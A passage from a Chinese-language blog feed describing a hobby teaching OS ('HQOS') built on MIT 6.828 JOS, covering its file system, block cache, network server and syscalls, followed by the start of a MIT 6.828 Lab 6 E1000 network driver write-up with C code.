File descriptor</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NDIRECT10</span></span><br><span class="line"><span class="comment">// Number of direct block pointers in an indirect block</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NINDIRECT(BLKSIZE / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> {</span></span><br><span class="line"><span class="type">char</span> f_name[MAXNAMELEN];<span class="comment">// filename</span></span><br><span class="line"><span class="type">off_t</span> f_size;<span class="comment">// file size in bytes</span></span><br><span class="line"><span class="type">uint32_t</span> f_type;<span class="comment">// file type</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Block pointers.</span></span><br><span class="line"><span class="comment">// A block is allocated iff its value is != 0.</span></span><br><span class="line"><span class="type">uint32_t</span> f_direct[NDIRECT];<span class="comment">// direct blocks</span></span><br><span class="line"><span class="type">uint32_t</span> f_indirect;<span class="comment">// indirect block</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pad out to 256 bytes; must do arithmetic in case we're compiling</span></span><br><span class="line"><span class="comment">// fsformat on a 64-bit machine.</span></span><br><span class="line"><span class="type">uint8_t</span> f_pad[<span class="number">256</span> - MAXNAMELEN - <span class="number">8</span> - <span class="number">4</span>*NDIRECT - <span class="number">4</span>];</span><br><span class="line">} __attribute__((packed));<span class="comment">// required only on some 64-bit machines</span></span><br></pre></td></tr></tbody></table></figure><h4 id="Directories"><a href="#Directories" class="headerlink" title="Directories"></a>Directories</h4><p>保存文件的元数据,目录本身也是一个文件,其元数据保存在其上层目录中.根目录的内容保存在超级块中.</p><h3 id="File-System-Structure"><a href="#File-System-Structure" class="headerlink" title="File System Structure"></a>File System Structure</h3><h4 id="Disk-Access"><a href="#Disk-Access" class="headerlink" title="Disk Access"></a>Disk Access</h4><p>HQOS没有在内核中添加IDE磁盘驱动程序及相关系统调用,而是将其实现于用户态的文件系统中.文件系统进程使用了EFLAGS中的IOPL位,有权限执行IO指令.</p><h4 id="Block-Cache"><a href="#Block-Cache" class="headerlink" title="Block Cache"></a>Block Cache</h4><p>HQOS借助虚拟地址空间来实现块缓存.文件系统的DISKMAP(0x10000000 )至DISKMAP+DISKMAX(0xD0000000)用来缓存磁盘,共3GB空间,故HQOS仅支持3GB以下的磁盘.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Return the virtual address of this disk block.</span></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">diskaddr</span><span class="params">(<span class="type">uint32_t</span> blockno)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (blockno == <span class="number">0</span> || (super &amp;&amp; blockno &gt;= super-&gt;s_nblocks))</span><br><span class="line">panic(<span class="string">"bad block number %08x in diskaddr"</span>, blockno);</span><br><span class="line"><span class="keyword">return</span> (<span class="type">char</span>*) (DISKMAP + blockno * BLKSIZE);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>HQOS并不直接读取完整的3GB磁盘空间到地址空间中,而是当访问磁盘块所在页时,触发页面错误,由错误处理例程从磁盘中读入并完成映射.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fault any disk block that is read in to memory by</span></span><br><span class="line"><span class="comment">// loading it from disk.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">bc_pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br></pre></td></tr></tbody></table></figure><p>文件系统依赖页面的PTE_D(dirty)位来决定是否需要刷新块(写回到磁盘).</p><p>由于目前HQOS还未实现页面置换算法,我很担心Block Cache对内存的消耗.</p><h4 id="Block-Bitmap"><a href="#Block-Bitmap" class="headerlink" title="Block Bitmap"></a>Block Bitmap</h4><p>HQOS使用Bitmap来记录磁盘中Block的使用状态,进而完成分配释放等操作.</p><h3 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h3><p>文件系统接口是以进程间通信的方式提供的.文件系统持续无休止的接收其他进程的IPC请求,将请求调度到特定的处理例程,完成请求的文件操作.</p><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><p>我暂时还不熟悉计算机网络相关知识,所以对Network部分的说明不会太多.</p><h3 id="Network-System"><a href="#Network-System" class="headerlink" title="Network System"></a>Network System</h3><p>这是HQOS网络体系的总览.HQOS使用E1000网卡,在Kernel中实现由E1000的驱动程序,负责将packet传给E1000或从E1000接收packet.与E1000驱动程序进行交互的是用户态的Network server,由核心网络进程、输出进程、输入进程构成.<br>核心网络进程的实现使用了开源的IwIP的TCP/IP协议套件.</p><p>其他用户进程通过IPC机制与Network server交互.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311152114274.png"></p><h2 id="System-calls-Interrupts-Exceptions"><a href="#System-calls-Interrupts-Exceptions" class="headerlink" title="System calls, Interrupts, Exceptions"></a>System calls, Interrupts, Exceptions</h2><p>实话说我不认为System calls, Interrupts, Exceptions的概念是与其他操作系统概念并列的,不过作为OS实现的重要部分,我需要单独的一章来说明,之前已经在其他操作系统概念的说明中介绍过的部分不再说明.</p><h3 id="Protected-Control-Transfer"><a href="#Protected-Control-Transfer" class="headerlink" title="Protected Control Transfer"></a>Protected Control Transfer</h3><h4 id="The-Interrupt-Descriptor-Table"><a href="#The-Interrupt-Descriptor-Table" class="headerlink" title="The Interrupt Descriptor Table"></a>The Interrupt Descriptor Table</h4><p>异常和中断导致处理器从用户模式切换到内核模式,内核模式的入口点和中断处理例程由内核明确规定.在HQOS中,所有的中断或异常都会导致切换到内核态,并由内核态进行处理(即使HQOS允许用户态页面错误处理例程,那也是先进入内核再由内核处理例程dispatch),这是在中断描述符表IDT中实现的.</p><p>HQOS目前仅支持中断门,意味着HQOS不支持嵌套中断.</p><h4 id="The-Task-State-Segment"><a href="#The-Task-State-Segment" class="headerlink" title="The Task State Segment"></a>The Task State Segment</h4><p>发生中断时,处理器将状态保存到TSS段中ESP3和SS3中,并加载ESP0和SS0,从内核返回是逆过程.HQOS目前仅使用TSS作为用户/内核堆栈的切换.HQOS目前为每个CPU分配了一个内核堆栈.</p><h3 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// syscall.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">sys_cputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_cgetc</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">envid_t</span><span class="title function_">sys_getenvid</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_destroy</span><span class="params">(<span class="type">envid_t</span>)</span>;</span><br><span class="line"><span class="type">void</span><span class="title function_">sys_yield</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">envid_t</span> <span class="title function_">sys_exofork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_set_status</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">int</span> status)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_set_trapframe</span><span class="params">(<span class="type">envid_t</span> env, <span class="keyword">struct</span> Trapframe *tf)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_env_set_pgfault_upcall</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *upcall)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_alloc</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_map</span><span class="params">(<span class="type">envid_t</span> src_env, <span class="type">void</span> *src_pg,</span></span><br><span class="line"><span class="params">     <span class="type">envid_t</span> dst_env, <span class="type">void</span> *dst_pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_page_unmap</span><span class="params">(<span class="type">envid_t</span> env, <span class="type">void</span> *pg)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_ipc_try_send</span><span class="params">(<span class="type">envid_t</span> to_env, <span class="type">uint32_t</span> value, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sys_ipc_recv</span><span class="params">(<span class="type">void</span> *rcv_pg)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sys_time_msec</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys_tx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> nbytes)</span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="User-library"><a href="#User-library" class="headerlink" title="User library"></a>User library</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exit.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pgfault.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">set_pgfault_handler</span><span class="params">(<span class="type">void</span> (*handler)(<span class="keyword">struct</span> UTrapframe *utf))</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// readline.c</span></span><br><span class="line"><span class="type">char</span>*<span class="title function_">readline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *buf)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ipc.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">ipc_send</span><span class="params">(<span class="type">envid_t</span> to_env, <span class="type">uint32_t</span> value, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span>;</span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">ipc_recv</span><span class="params">(<span class="type">envid_t</span> *from_env_store, <span class="type">void</span> *pg, <span class="type">int</span> *perm_store)</span>;</span><br><span class="line"><span class="type">envid_t</span><span class="title function_">ipc_find_env</span><span class="params">(<span class="keyword">enum</span> EnvType type)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fork.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>PTE_SHARE0x400</span></span><br><span class="line"><span class="type">envid_t</span><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fd.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">close</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">ssize_t</span><span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">ssize_t</span><span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">seek</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="type">void</span><span class="title function_">close_all</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">ssize_t</span><span class="title function_">readn</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">dup</span><span class="params">(<span class="type">int</span> oldfd, <span class="type">int</span> newfd)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Stat *statbuf)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">stat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> Stat *statbuf)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// file.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">int</span> mode)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">ftruncate</span><span class="params">(<span class="type">int</span> fd, <span class="type">off_t</span> size)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">remove</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">sync</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pageref.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">pageref</span><span class="params">(<span class="type">void</span> *addr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sockets.c</span></span><br><span class="line"><span class="type">int</span>     <span class="title function_">accept</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">bind</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">shutdown</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> how)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">connect</span><span class="params">(<span class="type">int</span> s, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">listen</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> backlog)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nsipc.c</span></span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_accept</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *addr, <span class="type">socklen_t</span> *addrlen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_bind</span><span class="params">(<span class="type">int</span> s, <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_shutdown</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> how)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_close</span><span class="params">(<span class="type">int</span> s)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_connect</span><span class="params">(<span class="type">int</span> s, <span class="type">const</span> <span class="keyword">struct</span> sockaddr *name, <span class="type">socklen_t</span> namelen)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_listen</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> backlog)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_recv</span><span class="params">(<span class="type">int</span> s, <span class="type">void</span> *mem, <span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_send</span><span class="params">(<span class="type">int</span> s, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span>     <span class="title function_">nsipc_socket</span><span class="params">(<span class="type">int</span> domain, <span class="type">int</span> type, <span class="type">int</span> protocol)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spawn.c</span></span><br><span class="line"><span class="type">envid_t</span><span class="title function_">spawn</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *program, <span class="type">const</span> <span class="type">char</span> **argv)</span>;</span><br><span class="line"><span class="type">envid_t</span><span class="title function_">spawnl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *program, <span class="type">const</span> <span class="type">char</span> *arg0, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">cputchar</span><span class="params">(<span class="type">int</span> c)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">iscons</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">opencons</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pipe.c</span></span><br><span class="line"><span class="type">int</span><span class="title function_">pipe</span><span class="params">(<span class="type">int</span> pipefds[<span class="number">2</span>])</span>;</span><br><span class="line"><span class="type">int</span><span class="title function_">pipeisclosed</span><span class="params">(<span class="type">int</span> pipefd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wait.c</span></span><br><span class="line"><span class="type">void</span><span class="title function_">wait</span><span class="params">(<span class="type">envid_t</span> env)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sleep.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span> ms)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">transpackt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> nbytes)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">recvpackt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> max_bytes,<span class="type">int</span>* lenth_store)</span>;</span><br></pre></td></tr></tbody></table></figure><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><p><a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">Intel 80386 Reference Manual</a><br><a href="https://pdos.csail.mit.edu/6.828/2018/readings/hardware/8254x_GBe_SDM.pdf">Intel’s Software Developer’s Manual for the E1000</a></p>]]></content>
      
      
      <categories>
          
          <category> 程序设计 </category>
          
          <category> HQOS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HQOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828 Lab6</title>
      <link href="/2023/6.828-Lab6/"/>
      <url>/2023/6.828-Lab6/</url>
      
        <content type="html"><![CDATA[<h2 id="Lab-6-Network-Driver"><a href="#Lab-6-Network-Driver" class="headerlink" title="Lab 6: Network Driver"></a>Lab 6: Network Driver</h2><h3 id="Part-A-Initialization-and-transmitting-packets"><a href="#Part-A-Initialization-and-transmitting-packets" class="headerlink" title="Part A: Initialization and transmitting packets"></a>Part A: Initialization and transmitting packets</h3><h4 id="time"><a href="#time" class="headerlink" title="time"></a>time</h4><p>在之前的时钟中断调度前加一个对time_tick函数的调用,注意时钟中断每个CPU都会收到,而我们的目的是计时,所以选择固定选择一个CPU来处理就好,bootcpu当然是最合适的.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET+IRQ_TIMER:</span><br><span class="line">lapic_eoi();</span><br><span class="line"><span class="keyword">if</span>(thiscpu==bootcpu)</span><br><span class="line">time_tick();</span><br><span class="line">sched_yield();</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></tbody></table></figure><span id="more"></span><h4 id="The-Network-Interface-Card"><a href="#The-Network-Interface-Card" class="headerlink" title="The Network Interface Card"></a>The Network Interface Card</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311131138871.png"></p><h5 id="PCI-Interface"><a href="#PCI-Interface" class="headerlink" title="PCI Interface"></a>PCI Interface</h5><p>现在要完成E1000作为一个PCI设备的识别和初始化</p><blockquote><p>The E1000 is a PCI device, which means it plugs into the PCI bus on the motherboard. The PCI bus has address, data, and interrupt lines, and allows the CPU to communicate with PCI devices and PCI devices to read and write memory. A PCI device needs to be discovered and initialized before it can be used. Discovery is the process of walking the PCI bus looking for attached devices. Initialization is the process of allocating I/O and memory space as well as negotiating the IRQ line for the device to use.</p></blockquote><blockquote><p> To perform PCI initialization during boot, the PCI code walks the PCI bus looking for devices. When it finds a device, it reads its vendor ID and device ID and uses these two values as a key to search the pci_attach_vendor array. </p><p>If the discovered device’s vendor ID and device ID match an entry in the array, the PCI code calls that entry’s attachfn to perform device initialization.</p></blockquote><p>在Software Developer’s Manual中找到E1000的vendor ID和device ID,为E1000声明一个用来attach的函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PCI_E1000_VENDOR_ID 0x8086</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCI_E1000_DEVICE_ID 0x100E</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">e1000_attach</span><span class="params">(<span class="keyword">struct</span> pci_func *pcif)</span>;</span><br></pre></td></tr></tbody></table></figure><p>填入pci_attach_vendor数组中,这样E1000可以被识别.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_driver</span> <span class="title">pci_attach_vendor</span>[] =</span> {</span><br><span class="line">{PCI_E1000_VENDOR_ID,PCI_E1000_DEVICE_ID,e1000_attach},</span><br><span class="line">{ <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> },</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="Memory-mapped"><a href="#Memory-mapped" class="headerlink" title="Memory-mapped"></a>Memory-mapped</h5><blockquote><p>Software communicates with the E1000 via memory-mapped I/O (MMIO).</p></blockquote><p>mmio_map_region的实现在lab4中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* e1000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">e1000_attach</span><span class="params">(<span class="keyword">struct</span> pci_func *pcif)</span></span><br><span class="line">{</span><br><span class="line">    pci_func_enable(pcif);</span><br><span class="line"></span><br><span class="line">    e1000 = mmio_map_region(pcif-&gt;reg_base[<span class="number">0</span>],pcif-&gt;reg_size[<span class="number">0</span>]);</span><br><span class="line">    cprintf(<span class="string">"Device e1000 attached, status:%p\n"</span>,*(<span class="type">uint32_t</span>*)(e1000+<span class="number">8</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Transmitting-Packets"><a href="#Transmitting-Packets" class="headerlink" title="Transmitting Packets"></a>Transmitting Packets</h4><h5 id="C-Structures"><a href="#C-Structures" class="headerlink" title="C Structures"></a>C Structures</h5><p>加上e1000设备的初始化操作</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e1000_tx_desc</span> <span class="title">tds</span>[<span class="title">NTRANS_DESC</span>];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">e1000_attach</span><span class="params">(<span class="keyword">struct</span> pci_func *pcif)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    pci_func_enable(pcif);</span><br><span class="line"></span><br><span class="line">    e1000 = mmio_map_region(pcif-&gt;reg_base[<span class="number">0</span>],pcif-&gt;reg_size[<span class="number">0</span>]);</span><br><span class="line">    cprintf(<span class="string">"Device e1000 attached, status:%p\n"</span>,*(<span class="type">uint32_t</span>*)(e1000+E1000_STATUS));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAL) = PADDR(tds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDLEN) = TDLEN;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TCTL) = E1000_TCTL_EN|</span><br><span class="line">                                    E1000_TCTL_PSP|</span><br><span class="line">                                (E1000_TCTL_COLD&amp;(<span class="number">0x40</span>&lt;&lt;E1000_TCTL_COLD_SHIFT));</span><br><span class="line">                                </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TIPG) = <span class="number">10</span> | (<span class="number">8</span> &lt;&lt; <span class="number">10</span>) | (<span class="number">12</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span 